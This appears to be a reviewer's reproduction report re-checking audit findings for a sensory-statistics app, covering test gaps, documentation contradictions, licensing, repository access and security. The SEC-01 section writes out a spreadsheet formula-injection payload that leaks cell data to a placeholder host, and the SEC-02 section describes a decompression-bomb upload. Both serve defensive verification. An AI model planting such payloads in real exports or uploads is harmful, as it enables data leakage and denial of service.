# Challenge B: independent reproduction results

All commands run from `/var/home/Lukas/Projects/RATA-Flow-App` with `env/bin/python` (Python 3.14.7, statsmodels 0.15.0, scikit-learn 1.9.1, scipy 1.18.1, numpy 2.5.3). Scratch scripts in this folder (`sec01.py`, `sec02b.py`, `t3.py`). No repo, venv or git state was modified.

| ID | Verdict | Claimed | Recommended | One-line reason |
|---|---|---|---|---|
| TEST-01 | REPRODUCED (facts); breakage on other versions not demonstrated | HIGH | MEDIUM | No CI/lockfile is real, but pins fail loudly rather than giving wrong results; the "Excel baseline" pin is a sheet-name list, not version-sensitive |
| TEST-02 | REPRODUCED (by name search; no coverage tool installed) | HIGH | MEDIUM | Gaps are real and partly self-declared in `validation/README.md`; no wrong result shown (I confirmed DA Type III on unequal replication is correct today) |
| SEC-01 | REPRODUCED | HIGH | MEDIUM (HIGH if hosted or fed third-party free text) | 2175 live formula cells via the real RATA builder; needs attacker-controlled labels and Excel prompts for external content |
| SEC-02 | REPRODUCED | HIGH hosted / LOW local | LOW (MEDIUM if a hosted deployment is planned) | 0.30 MB file parses to 1M rows, 15.9 s, 526 MB peak; no hosted deployment is documented |
| SEC-04 | REPRODUCED (facts) | HIGH | HIGH, becomes BLOCKER for making the repo public; merge with REL-02 | Files are in pushed `origin/main` history; legal status is the owner's judgement |
| REL-01 | REPRODUCED | HIGH | HIGH | Clone URL and citation URL 404 for everyone; but fixing it by going public is gated by SEC-04/REL-02 |
| REL-02 | REPRODUCED (facts); duplicate of SEC-04 | HIGH | merge into SEC-04 | Same files, same commits |
| REL-03 | REPRODUCED (facts) | HIGH | MEDIUM | Only copyleft dep, one guarded import, optional in practice; licensing position is a decision for the owner, not a defect |
| DOC-01 | REPRODUCED, 10 of 10 contradictions hold (item 6 weak) | HIGH | HIGH | Several are exactly what a user would paste into a methods section (SE denominator, REML vs ML, "Satterthwaite", 10,000 vs 999 permutations, B = 200 vs 500) |
| DOC-02 | PARTLY REPRODUCED | HIGH | MEDIUM | Fusion does have an `Analysis_Info` method sheet; the rest holds (no CITATION.cff/DOI, no library versions in exports) |

---

## TEST-01: no CI, no lockfile, one Python version

Commands and output:
- `ls -a .github` -> `No such file or directory`; `ls *.lock constraints*.txt poetry.lock uv.lock` -> none exist.
- `cat requirements.txt`: floors plus major caps only, as claimed (`statsmodels>=0.14.2,<1.0.0`, `scipy>=1.13.0,<2.0.0`, `scikit-learn>=1.5.0,<2.0.0`, `numpy>=2.3.2,<3.0.0`, `pingouin>=0.5.4,<1.0.0`).
- `README.md:35`: "Python 3.11–3.14 ... recommended". Venv: Python 3.14.7, statsmodels 0.15.0, sklearn 1.9.1, scipy 1.18.1.
- `tests/test_stage_f_smoke.py:77`: `assert float(finite_lr.sum()) == pytest.approx(1292.263, abs=1e-3)` inside `test_rata_lmm_pin` (exists as claimed).
- Seeded RNG use in `stats/cata.py`, `stats/pls.py`, `stats/segmentation.py`, `stats/multivariate.py` and several tests confirmed by grep.

Correction: the "Excel sheet baselines in `test_export_rata.py`" (`DA_BASELINE_SHEETS`, line 125) is a list of sheet names, which is not sensitive to library versions. I did not install other library versions (no venv changes permitted), so the claim that the numeric pins would break elsewhere is plausible but not demonstrated.

Severity: MEDIUM. Missing CI and lock are a genuine release-hygiene gap and a user on 3.11 is untested, but a version drift makes a pin fail visibly; it does not by itself make the app produce wrong results without warning.

## TEST-02: statistical methods without known-answer tests

Command: for each named function, `grep -rlw <fn> tests | wc -l` and `grep -rlw <fn> validation | wc -l`.
Key output (tests / validation files mentioning the name):
- `compute_cv_coefficient_stability` 0/0, `compute_jar_penalty_long` 0/0, `compute_jar_distribution` 0/0, `compute_penalty` 0/0, `build_cld_from_mcnemar` 0/0, `wilson_ci` 0/0.
- `run_cata_contrast`, `compute_ca_ellipses`: 0 tests; validation hits are only README "not validated" notes.
- `compute_demographic_association`: 1 test hit, which is a docstring mention (`tests/test_apptest_liking.py:638`), not a call.
- `varimax` is a nested function in `calculate_pca` (`stats/multivariate.py:129`); `grep -rn "apply_varimax\|da_pca_varimax" tests` returns nothing, so no test turns it on.
- `compute_twoway_anova_demo`: 0 tests; `validation/README.md:82-84` says spot-checked, no committed harness.
- `validation/README.md:70-86` "Not reference-validated (yet)" lists CA ellipses, `run_cata_contrast`, CATA penalty, panel-performance dimensions other than ICC, PLS jackknife/permutation, the demographics LMM, segmentation and the averaged preference surface. So much of this finding is already self-declared by the project.
- `validation/DA/da_reference.R:5`: "Type I = Type II = Type III SS and base-R aov() is exact" (balanced only). `tests/test_unbalanced_designs.py:122-131` checks only `ss_type == 'III'`, not a number.

Independent check of the Type III claim (`t3.py`, 8 assessors x 4 products, 1 or 3 replicates per cell, my own data): FreeSense `F_product = 30.485`, df_error 21, tested against Interaction; statsmodels `anova_lm(typ=3)` with Sum coding, MS_P / MS_PxA = 30.4853. Correct today, unprotected by a test, as claimed.

Caveat: `coverage` is not installed, so "never executed" is based on name search, not measured coverage; AppTest runs could reach some of these indirectly.

Severity: MEDIUM. The gaps are real, but no incorrect result was shown and the project documents most of them; this is risk, not a demonstrated defect.

## SEC-01: Excel formula injection

Reproduction (`sec01.py`): sensochoc through the production RATA pipeline (`clean_and_structure_data`, `run_mixed_models`, `run_cochrans_q`, `generate_cld`) with product labels replaced by `=HYPERLINK("http://example.invalid/?x="&A2,"click")`, `=1+1`, `+1+2`, `-3+4`, `@SUM(1)` and one attribute renamed `=2*21`, then `utils.export.generate_excel_report(...)`. Cells with `data_type == 'f'` counted with openpyxl.

Output:
```
Results_Table 3 [('D1', '=1+1'), ('E1', '=HYPERLINK("http://example.invalid/?x="&A2,"click")')]
Descriptives_CLD 34 ...  Means_Wide 3 ...  TickingRate_Wide 3 ...  TickingRatePerRep_Wide 3 ...
LMM_ANOVA 1  PostHoc_Pairwise 155  CochransQ 1  Raw_Data 1972
total formula cells 2175
non-= prefix stored as s '+1+2' Results_Table
```
Raw XML confirms real formulas: `<c r="E1" s="1"><f>HYPERLINK("http://example.invalid/?x="&amp;A2,"click")</f>`. `grep` for any sanitising (`startswith('=')`, `quotePrefix`, `data_type`, `sanitis`) in `utils/` and `core/` finds nothing. The upload path accepted the `=` labels without complaint. Counts differ from the reviewer's (different injected labels), but the mechanism and affected sheets match; `+`, `-`, `@` are stored as strings, as claimed.

Severity: MEDIUM. The documented use is a local tool where the analyst uploads their own data, so exploitation needs attacker-controlled labels (for example consumer free text in a demographics file) and modern Excel warns before external links or DDE. There is also a quiet correctness angle: a label that legitimately starts with `=` is exported as a computed value rather than the label. HIGH is defensible only for a hosted or shared-data deployment.

## SEC-02: no upload cap, decompression amplification

- `.streamlit/config.toml` `[server]` contains only `headless = true`; `streamlit.config.get_option('server.maxUploadSize')` -> `200`.
- `core/data.py:8-37` `load_data`: plain `pd.read_csv` / `pd.read_excel`, no size or row limit, `@st.cache_data(max_entries=4)`.
- `sec02b.py` (hand-built sheet XML without cell references, deflate level 9, 1,000,000 x 5 rows), then the unwrapped `core.data.load_data`:
```
rows 1000000 compressed 0.30 MB uncompressed 86.0 MB ratio 290:1
shape (1000000, 5) 15.9s peak RSS MB 526
```
(An openpyxl-written sheet with cell references only reached 15:1.) Time is lower than the reviewer's 46 s, which is machine variance; memory matches. I did not run larger files.

Severity: LOW for the documented local install (README and config describe no hosted deployment); MEDIUM, not HIGH, if hosting is planned, since it degrades availability rather than exposing data.

## SEC-04 and REL-02 (duplicates): third-party files in git history

Facts (verified):
- `git log --all --diff-filter=A`: `acf8ffa` 2026-03-27 `example_data/LIK_tuto_EN.xlsm`; `1a6d701` 2026-04-18 `docs/PLS.pdf` and `notebooks/pls_validation.ipynb`; `fd50b56` 2026-05-02 `PLS.pptx`; `291d6d5` 2026-06-13 `Rplots.pdf`; plus `validation/PrefMap/_out/carto_reference.pdf`.
- Removed: `01065d1` (xlsm), `a6b5d33` (PLS.pdf), `bbd91e2` (pptx). `git ls-files` shows none in the current tree.
- `git merge-base --is-ancestor <c> origin/main` -> yes for `acf8ffa`, `fd50b56`, `1a6d701`: the files are in pushed history.
- `LIK_tuto_EN.xlsm`: `docProps/core.xml` creator "Fabien Llobell", created 2022-03-18; 26 sheets, including `XLSTAT_20220318_155103_1_HID15`; contains `xl/vbaProject.bin` (92,160 bytes).
- `PLS.pptx`: creator "Gemma", created 2017-10-23; slide text mentions XLSTAT 6 times ("Applying PLS to the Packet Soup data ...").
- `docs/PLS.pdf`: no Producer/Author metadata; outline titles decode to "Relating to Instrumental and Consumer data Partial Least Square", "Overview", "Principal Components Regression", "Partial Least Squares" (lecture-notes style; origin not established).
- Only `LICENSE` (MIT, "Copyright (c) 2026 Lukas Danner") exists; no NOTICE/COPYING ever appears in history.
- `Rplots.pdf` and `carto_reference.pdf` look like the project's own R output, not third-party material; they are clutter, not a licensing issue on their face.

Judgement for the owner (not a legal conclusion): whether redistributing the XLSTAT tutorial workbook, the 2017 slides and the PDF is permitted. Today the repository is private (REL-01), so nothing is exposed yet.

Severity: keep one finding (SEC-04 = REL-02). HIGH now; it is a BLOCKER for the act of making the repository public unless the owner clears the material or rewrites history.

## REL-01: repository is private

Commands (unauthenticated):
```
curl -s -o /dev/null -w '%{http_code}' https://github.com/Sesnor-y/FreeSense      -> 404
curl -s ... https://api.github.com/repos/Sesnor-y/FreeSense                         -> 404 {"message": "Not Found"}
curl -s ... https://github.com/Sesnor-y                                             -> 200
curl -s https://api.github.com/users/Sesnor-y/repos                                  -> no public repos listed
GIT_TERMINAL_PROMPT=0 git -c credential.helper= ls-remote https://github.com/Sesnor-y/FreeSense.git
  -> fatal: could not read Username for 'https://github.com': terminal prompts disabled
```
`README.md:45` (`git clone https://github.com/Sesnor-y/FreeSense.git`) and `README.md:425` (citation URL) both point there. `origin` is that URL. Private vs deleted is inferred, as the reviewer says; I did not run an authenticated check.

Severity: HIGH (every external user fails at the install step). Note the dependency: the obvious fix, making it public, triggers SEC-04/REL-02.

## REL-03: pingouin (GPL-3.0)

Facts (verified):
- `importlib.metadata` scan of the venv: the only GPL distribution is `pingouin 0.6.1 | GPL-3.0` (no LGPL either).
- Only import site: `stats/panel_performance.py:21-25`, `try: import pingouin as pg ... except ImportError: PINGOUIN_AVAILABLE = False`; only call `pg.intraclass_corr` at line 253 under `if PINGOUIN_AVAILABLE`. `modules/descriptive/workflow.py:1279-1298` shows captions when it is absent.
- `requirements.txt:11` installs it by default with the comment "optional".
- README "License" (`README.md:429-452`) discusses only MIT code and GPL datasets; pingouin is not mentioned there.
- With pingouin blocked (`sys.modules['pingouin']=None`, then `pytest tests/test_panel_performance_summary.py`): `12 passed`, `PINGOUIN_AVAILABLE False`. I did not rerun the validation pins or the DA AppTest file, so the reviewer's "19 passed" is only partly re-checked.
- Unrelated stale comment spotted: `modules/descriptive/workflow.py:1185` says the DA model is "mixed ANOVA (pingouin)", but the DA ANOVA is OLS in `stats/da_anova.py`.

Judgement for the owner: the finding's paragraphs on combined works, hosting and bundled binaries are interpretation, not something I can verify. The technical facts are that dropping pingouin from the default install (an extra, for example) costs only the ICC CI columns.

Severity: MEDIUM. A licensing decision with an easy technical workaround, not a defect; it rises only if the owner plans binary or container distribution.

## DOC-01: methods reference contradicts the code

Each item checked against `Statistical_Methods_README.md` and the code:
1. HOLDS. Lines 851 ("number of assessors (unique, not observations)") vs `stats/posthoc.py:144-157` `_observation_counts` = `groupby(product).size()`, whose docstring says `nunique(assessor)` would be wrong; §5a line 269 agrees with the code; §23a line 1281 repeats "unique assessors" while `stats/contrast.py:424-425, 706-707` use `_observation_counts`.
2. HOLDS. Line 1322 "Note on family size" says the BH family is only the selected comparisons; `stats/contrast.py:578-610` corrects over the full C(n,2) family (comment "B.23 / F-03").
3. HOLDS. Lines 1448-1450 "Why ML, not REML"; `stats/liking.py:1-15` docstring and lines 236-244 fit REML for LS means/covariance and ML only for the LRT.
4. HOLDS. Line 1458 heading "Satterthwaite Degrees of Freedom" for `df = n_consumers - n_products`; code `stats/liking.py:197, 290` names it `df_satterthwaite`. (Pairwise code at 801-810 computes a Welch-type df for some cases, but the documented quantity is not Satterthwaite.)
5. HOLDS. Line 354 says `fillna(0)` in `stats/multivariate.py`; `grep -n fillna stats/multivariate.py` returns nothing.
6. HOLDS, weak. Formula blocks at 687 and 699 show `C(Product) + C(Assessor)`; code uses `C(Prod_Safe, Sum)` (`stats/da_anova.py:224`). But line 712 of the same section states the Sum coding correctly, and for the unreplicated additive model the coding does not change the Product SS, so the impact is small.
7. HOLDS. Line 710 "recommended convention in Langsrud (2003)"; the reference at line 816 is titled "Use Type II instead of Type III sums of squares" and itself says FreeSense departs from it.
8. HOLDS. §51 says default B = 200, "Increase to 1000+", and "ellipse-confidence sliders"; `modules/cata/ui.py:2157-2158` `_CA_DEFAULT_N_BOOT = 500`, `_CA_DEFAULT_SEED = 42`, call at 2340-2342 hard-codes `confidence=0.95`; no n_boot/confidence widget exists (the only sliders are thresholds).
9. HOLDS. Line 1647 "10,000 permutations"; `stats/segmentation.py:24` `DEFAULT_PERMUTATION_N = 999`; the caller `modules/liking/workflow.py:1253-1257` passes no `n_permutations`. K-means `random_state=42` (`stats/segmentation.py:243`) is not documented; the only documented `random_state=42` (line 2000) is for PLS k-fold.
10. HOLDS. Line 2593 lists "BH (default), BY ..., Bonferroni, and Holm"; `modules/cata/ui.py:118` offers `["FDR (Benjamini-Hochberg)", "Bonferroni", "Holm", "Uncorrected"]`.

10 of 10 hold. Severity: HIGH is right. None changes a computed number, but items 1, 3, 4, 8 and 9 would put false statements into a user's published methods section.

## DOC-02: no methods text, citation or engine versions

- `ls CITATION.cff` -> absent. README citation (`README.md:421-425`) is a bare software citation with a URL that 404s (REL-01), no DOI.
- No template methods paragraph found in README or the methods reference.
- `Methods_Notes` sheets: RATA (`utils/export.py:964`) and CATA (`:2553`) only. **Refuted in part:** Fusion writes an `Analysis_Info` sheet (`utils/export.py:~1740-1800`) with module, paradigm, method description, preprocessing, CV and permutation settings. DA, Liking and PrefMap do have only `Run_Parameters`.
- `build_run_parameters_sheet` records `freesense_version` from `core/__version__.py` (`"1.0.0"`); grep finds no statsmodels/scipy/sklearn/pingouin/Python version anywhere in `utils/export.py`.
- `git tag -l` -> `v0.2.0`, `v1.0.0`; `git rev-list --count v1.0.0..HEAD` -> `146`, so exports stamped "1.0.0" do not identify the code that produced them.

Severity: MEDIUM. A reproducibility and convenience gap with a workaround (the user writes the methods text and records versions); the version-stamp point is the most important part.
